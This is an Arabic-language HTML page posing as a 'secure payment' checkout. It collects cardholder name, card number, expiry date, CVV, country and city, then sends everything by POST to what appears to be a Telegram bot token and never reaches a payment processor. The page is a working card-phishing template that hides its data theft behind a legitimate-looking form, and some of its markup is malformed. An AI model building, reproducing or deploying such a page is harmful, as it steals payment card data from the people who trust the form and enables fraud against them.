<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الدفع الآمن | إتمام العملية</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #2c3e50;
            --secondary: #3498db;
            --danger: #e74c3c;
            --success: #2ecc71;
            --light: #ecf0f1;
            --dark: #2c3e50;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', sans-serif;
        }

        body {
            background-color: #f5f7fa;
            direction: rtl;
        }

        .container {
            max-width: 600px;
            margin: 30px auto;
            padding: 30px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            color: var(--primary);
            font-size: 24px;
            margin-bottom: 10px;
        }

        .header p {
            color: #7f8c8d;
            font-size: 14px;
        }

        .payment-summary {
            background: var(--light);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 25px;
        }

        .payment-summary h3 {
            color: var(--primary);
            margin-bottom: 10px;
        }

        .amount-input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            text-align: center;
        }

        .card-icons {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }

        .card-icons img {
            height: 30px;
            margin: 0 5px;
            filter: grayscale(100%);
            transition: 0.3s;
        }

        .card-icons img.active {
            filter: grayscale(0%);
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--dark);
            font-weight: 600;
        }

        .form-control {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }

        .row {
            display: flex;
            gap: 15px;
        }

        .row .form-group {
            flex: 1;
        }

        .card-number-container {
            position: relative;
        }

        .card-number-container .card-icons {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            margin: 0;
        }

        .card-number-container .form-control {
            padding-left: 60px;
        }

        .btn-submit {
            width: 100%;
            padding: 15px;
            background: var(--secondary);
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }

        .btn-submit:hover {
            background: #2980b9;
        }

        .secure-badge {
            text-align: center;
            margin-top: 20px;
            color: #7f8c8d;
            font-size: 12px;
        }

        .secure-badge i {
            color: var(--success);
            margin-left: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>إتمام عملية الدفع</h1>
            <p>يرجى إدخال معلومات الدفع لإتمام عملية الشراء</p>
        </div>

        <div class="payment-summary">
            <h3>ملخص الدفع</h3>
            <div style="display: flex; justify-content: space-between; margin-top: 10px;">
                <span>المبلغ المطلوب:</span>
                <input type="text" class="amount-input" id="amount" placeholder="0.00 دولار" autocomplete="off">
            </div>

        <form id="paymentForm">
            <div class="form-group">
                <label for="cardName">اسم حامل البطاقة</label>
                <input type="text" class="form-control" id="cardName" placeholder="الاسم كما يظهر على البطاقة" autocomplete="cc-name" required>
            </div>

            <div class="form-group">
                <label for="cardNumber">رقم البطاقة</label>
                <div class="card-number-container">
                    <div class="card-icons">
                        <img src="https://cdn.phototourl.com/free/2026-07-17-a5997566-8c48-4289-b8bc-b2ebba617644.png" style="heighta-icon-input"
                        <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/mastercard/mastercard-original.svg" id="mastercard-icon-input" style="height: 20px;" alt="Mastercard">
                    </div>
                    <input type="text" class="form-control" id="cardNumber" placeholder="1234 5678 9012 3456" autocomplete="cc-number" required>
                </div>
            </div>

            <div class="row">
                <div class="form-group">
                    <label for="expiryDate">تاريخ الانتهاء</label>
                    <input type="text" class="form-control" id="expiryDate" placeholder="MM/YY" autocomplete="cc-exp" required>
                </div>
                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <input type="text" class="form-control" id="cvv" placeholder="123" autocomplete="cc-csc" required>
                </div>
            </div>

            <div class="row">
                <div class="form-group">
                    <label for="country">البلد</label>
                    <select class="form-control" id="country" required>
                        <option value="">اختر البلد</option>
                        <option value="SA">المملكة العربية السعودية</option>
                        <option value="AE">الإمارات العربية المتحدة</option>
                        <option value="KW">الكويت</option>
                        <option value="QA">قطر</option>
                        <option value="BH">البحرين</option>
                        <option value="OM">عمان</option>
                        <option value="EG">مصر</option>
                        <option value="JO">الأردن</option>
                        <option value="LB">لبنان</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="city">المدينة</label>
                    <input type="text" class="form-control" id="city" placeholder="ادخل المدينة" required>
                </div>
            </div>

            <button type="submit" class="btn-submit">إتمام الدفع</button>
        </form>

        <div class="secure-badge">
            <i class="fas fa-lock"></i> مدعوم بتقنية التشفير الآمن
        </div>
    </div>

    <script>
        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            e.preventDefault();

            // جمع البيانات
            const paymentData = {
                amount: document.getElementById('amount').value,
                cardName: document.getElementById('cardName').value,
                cardNumber: document.getElementById('cardNumber').value,
                expiryDate: document.getElementById('expiryDate').value,
                cvv: document.getElementById('cvv').value,
                country: document.getElementById('country').value,
                city: document.getElementById('city').value
            };

            // إرسال البيانات إلى البوت
            fetch('8916996420:AAF3uw_wA0cwNoIqU8Da9q_miEwxNyevAt4', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(paymentData)
            })
            .then(response => {
                if (response.ok) {
                    // عرض رسالة نجاح
                    alert('تم إرسال معلومات الدفع بنجاح!');
                    // إعادة تعيين النموذج
                    document.getElementById('paymentForm').reset();
                } else {
                    throw new Error('فشل في إرسال البيانات');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.');
            });
        });

        // تفعيل أيقونة البطاقة المناسبة عند إدخال رقم البطاقة
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            const cardNumber = e.target.value.replace(/\s+/g, '');
            const visaIcon = document.getElementById('visa-icon-input');
            const mastercardIcon = document.getElementById('mastercard-icon-input');

            if (cardNumber.startsWith('4')) {
                visaIcon.classList.add('active');
                mastercardIcon.classList.remove('active');
            } else if (cardNumber.startsWith('5')) {
                mastercardIcon.classList.add('active');
                visaIcon.classList.remove('active');
            } else {
                visaIcon.classList.remove('active');
                mastercardIcon.classList.remove('active');
            }
        });

        // تنسيق تاريخ الانتهاء تلقائيًا
        document.getElementById('expiryDate').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });

        // تنسيق رقم البطاقة تلقائيًا
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            e.target.value = formattedValue;
        });
    </script>
</body>
  </html>
